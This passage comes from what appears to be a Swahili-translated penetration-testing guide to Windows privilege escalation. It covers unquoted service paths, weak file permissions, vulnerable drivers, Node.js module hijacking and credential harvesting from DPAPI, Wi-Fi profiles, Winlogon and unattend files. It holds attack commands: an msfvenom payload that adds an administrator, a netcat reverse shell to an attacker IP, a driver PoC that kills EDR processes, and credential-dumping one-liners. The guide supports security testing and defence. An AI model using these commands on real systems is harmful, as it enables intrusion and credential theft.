Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha paths zote za service zisizo na quotes, ukiondoa zile zinazomilikiwa na huduma za Windows zilizojengewa ndani:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mikono binary ya service kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vya kufanywa ikiwa huduma itashindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation huenda ikawezekana. Maelezo zaidi yanaweza kupatikana kwenye [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Angalia **permissions of the binaries** (labda unaweza kuandika juu ya moja na kufanya privilege escalation) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kurekebisha faili fulani ya config ili kusoma faili maalum au kama unaweza kurekebisha binary fulani ambayo itaendeshwa na akaunti ya Administrator (schedtasks).

Njia ya kupata ruhusa dhaifu za folder/file katika system ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki plugin DLL yoyote chini ya folda zake ndogo `plugins`. Ikiwa kuna install ya portable/copy inayoweza kuandikwa, kudondosha plugin yenye nia ovu kunatoa execution ya code kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Angalia kama unaweza ku-overwrite baadhi ya registry au binary ambayo itatekelezwa na user tofauti.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta **third party weird/vulnerable** drivers zinazowezekana
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inatoa arbitrary kernel read/write primitive yoyote (kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kuongeza privilege kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa bugs za race-condition ambapo vulnerable call hufungua attacker-controlled Object Manager path, kupunguza makusudi kasi ya lookup (kwa kutumia max-length components au deep directory chains) kunaweza kupanua dirisha kutoka microseconds hadi tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Vulnerabilities za kisasa za hive hukuruhusu kufanya groom deterministic layouts, kutumia writable HKLM/HKU descendants, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Baadhi ya drivers hukubali registry path kutoka userland, huthibitisha tu kwamba ni UTF-16 string salama, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` na `RTL_QUERY_REGISTRY_DIRECT` kwenda kwenye stack scalar kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hufasiriwa kulingana na **actual** registry type, si type ambayo developer alitarajia.

Hii huunda primitives mbili muhimu:

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path huruhusu driver kuuliza keys zilizochaguliwa na attacker, leak existence kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: scalar destination kama `&readValue` huwa type-confused kama `REG_QWORD`, `UNICODE_STRING`, au sized binary buffer kutegemea registry value type.

Practical exploitation notes:

- **Windows 8+ mitigation**: ikiwa query inagonga **untrusted hive** na `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hucrash na `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili kubaki na exploitability, tafuta **attacker-writable keys ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha writable descendants za `\Registry\Machine`, na uendeshe tena scan kwa kutumia duplicated **low-integrity** token ili kupata keys zinazofikika kutoka sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: uandishi wa moja kwa moja wa bytes 8 ndani ya `int` ya bytes 4 huharibu data ya karibu ya stack na unaweza ku-overwrite kwa sehemu `callback`/`function pointer` iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` iweke kwenye `UNICODE_STRING`. Ikiwa code kwanza inapakia `REG_DWORD` inayodhibitiwa na mshambuliaji kwenye scalar ya stack kisha inatumia tena buffer hiyo hiyo kwa usomaji wa string, mshambuliaji hudhibiti `Length`/`MaximumLength` na huathiri sehemu ya `Buffer` pointer, na hivyo kupata semi-controlled kernel write.
- **`REG_BINARY`**: kwa binary data kubwa, direct mode hutafsiri `LONG` ya kwanza kwenye `EntryContext` kama signed buffer size. Ikiwa usomaji wa awali wa `REG_DWORD` unaacha thamani hasi inayodhibitiwa na mshambuliaji kwenye scalar iliyotumika tena, query inayofuata ya `REG_BINARY` hunakili bytes za mshambuliaji moja kwa moja juu ya stack slots za karibu, jambo ambalo mara nyingi ni njia iliyo safi zaidi ya ku-overwrite callback-pointer kikamilifu.

Muundo imara wa kuwinda: **heterogeneous registry reads kwenye same stack variable bila kuireinitialize**. Grep kwa `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointers za `EntryContext` zilizotumika tena, na code paths ambapo usomaji wa kwanza wa registry unaamua kama usomaji wa pili utafanyika.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, secure DACL halitekelezwi device inapofunguliwa kupitia path yenye component ya ziada, hivyo humruhusu mtumiaji yeyote asiye na privilege kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye real-world case)

Mara mtumiaji anapoweza kufungua device, privileged IOCTLs zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo uliobainika kwenye mazingira halisi ni pamoja na:
- Kurudisha handles za full-access kwa processes zozote (token theft / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write bila vizuizi (offline tampering, boot-time persistence tricks).
- Ku-terminate processes zozote, ikiwemo Protected Process/Light (PP/PPL), ikiruhusu AV/EDR kill kutoka user land kupitia kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Ubadilishaji kwa wasanidi
- Daima weka FILE_DEVICE_SECURE_OPEN unapounda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha caller context kwa privileged operations. Ongeza PP/PPL checks kabla ya kuruhusu process termination au kurudisha handle.
- Dhibiti IOCTLs (access masks, METHOD_*, input validation) na fikiria brokered models badala ya direct kernel privileges.

Mawazo ya detection kwa defenders
- Fuatilia user-mode opens za suspicious device names (mfano, \\ .\\amsdk*) na specific IOCTL sequences zinazoonyesha abuse.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na dumisha allow/deny lists zako.

## PATH DLL Hijacking

Ikiwa una **write permissions ndani ya folder iliyopo kwenye PATH** unaweza kuwa na uwezo wa hijack DLL inayopakiwa na process na **escalate privileges**.

Angalia permissions za folder zote zilizo ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa taarifa zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Hii ni toleo la **Windows uncontrolled search path** linaloathiri programu za **Node.js** na **Electron** wanapofanya import ya kawaida kama `require("foo")` na module inayotarajiwa **haipo**.

Node hutatua packages kwa kupanda juu kwenye mti wa directory na kuangalia folders za `node_modules` kwenye kila parent. Kwenye Windows, mwendo huo unaweza kufika hadi drive root, hivyo application iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kuishia kuchunguza:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **low-privileged user** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` mbaya (au package folder) na kusubiri **higher-privileged Node/Electron process** itatue dependency inayokosekana. Payload hutekelezwa katika security context ya process ya mwathiriwa, hivyo hili linakuwa **LPE** kila mara target inapoendeshwa kama administrator, kutoka kwenye elevated scheduled task/service wrapper, au kutoka kwenye auto-started privileged desktop app.

Hii ni ya kawaida hasa wakati:

- dependency imetangazwa katika `optionalDependencies`
- library ya mtu wa tatu inaweka `require("foo")` ndani ya `try/catch` na kuendelea endapo itashindwa
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` yenye udhaifu iko ndani kabisa ya dependency tree badala ya kuwa kwenye main application code

### Hunting vulnerable targets

Tumia **Procmon** kuthibitisha resolution path:

- Filter by `Process Name` = target executable (`node.exe`, Electron app EXE, au wrapper process)
- Filter by `Path` `contains` `node_modules`
- Lenga `NAME NOT FOUND` na final successful open chini ya `C:\node_modules`

Useful code-review patterns in unpacked `.asar` files or application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Unyonyeshaji

1. Tambua **jina la kifurushi kilichokosekana** kutoka Procmon au kupitia ukaguzi wa source.
2. Tengeneza root lookup directory ikiwa haipo tayari:
```powershell
mkdir C:\node_modules
```
3. Acha module yenye jina kamili linalotarajiwa:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Anzisha application ya mwathirika. Ikiwa application inajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya kweli ya modules za hiari zinazokosekana zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** muhimu ni sehemu inayoweza kutumika tena: tafuta **missing bare import** yoyote ambayo process ya Windows Node/Electron yenye privileges itaitatua.

### Mawazo ya detection na hardening

- Toa alert wakati user anaunda `C:\node_modules` au anaandika `.js` files/packages mpya hapo.
- Fuatilia high-integrity processes zinazosomea kutoka `C:\node_modules\*`.
- Pakia dependencies zote za runtime katika production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya third-party kwa patterns za kimya `try { require("...") } catch {}`.
- Zima optional probes wakati library inasaidia hivyo (kwa mfano, baadhi ya `ws` deployments zinaweza kuepuka legacy `utf-8-validate` probe kwa `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### faili ya hosts

Angalia kompyuta nyingine zinazojulikana zilizoandikwa moja kwa moja kwenye faili ya hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Miingiliano ya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizofunguliwa

Angalia **restricted services** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, tengeneza sheria, zima, zima...)**

Zaidi[ amri za uorodheshaji wa mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Kutoka kwa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **log in the users automaticall**y. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.

Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia vitambulisho vilivyohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya encryption ya symmetric ya data, hasa inayotumiwa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya encryption ya symmetric ya asymmetric private keys. Encryption hii hutumia siri ya user au system ili kuchangia kwa kiasi kikubwa entropy.

**DPAPI huwezesha encryption ya keys kupitia symmetric key inayotokana na login secrets za user**. Katika hali zinazohusisha system encryption, hutumia domain authentication secrets za system.

Encrypted user RSA keys, kwa kutumia DPAPI, huhifadhiwa katika saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya user. **DPAPI key, iliyohifadhiwa pamoja na master key inayolinda private keys za user katika faili moja**, kwa kawaida huwa na bytes 64 za data ya nasibu. (Ni muhimu kutambua kuwa ufikiaji wa saraka hii umewekewa vikwazo, hivyo kuzuia kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na arguments zinazofaa (`/pvk` au `/rpc`) ili kuisimbua.

**credentials files** zilizo protected by the master password kwa kawaida ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa nyingi DPAPI** **masterkeys** kutoka kwa **memory** kwa kutumia `sekurlsa::dpapi` module (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** mara nyingi hutumiwa kwa **scripting** na kazi za automation kama njia ya kuhifadhi credentials zilizosimbwa kwa urahisi. Credentials hizi zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha zinaweza kusimbuliwa tu na mtumiaji yule yule kwenye kompyuta ile ile waliyoundwa juu yake.

Ili **kusimbua** PS credentials kutoka kwenye file iliyo nazo unaweza kufanya hivi:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Kidhibiti cha Vitambulisho cha Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye Windows workstations kuhifadhi passwords na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii ipo katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na huwa inafaa kila mara kuitafuta na kuichunguza.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya High Integrity level.**\
**AppCmd.exe** ipo katika saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo basi inawezekana kwamba baadhi ya **credentials** zimewekwa na zinaweza **kupatikana tena**.

Msimbo huu ulitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Visakinishi **vinaendeshwa kwa ruhusa za SYSTEM**, vingi vinaathiriwa na **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Registry (Vitambulisho)

### Vitambulisho vya Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Vifunguo vya Mwenyeji vya SSH vya Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Funguo za SSH katika registry

Funguo binafsi za SSH zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys` kwa hivyo unapaswa kuangalia kama kuna kitu chochote cha kuvutia humo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ukikuta kiingilio chochote ndani ya path hiyo huenda ni SSH key iliyohifadhiwa. Imehifadhiwa ikiwa imesimbwa kwa njia fiche lakini inaweza kufichuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu technique hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa boot endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuyaongeza kwa `ssh-add` na kuingia kupitia ssh kwenye machine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
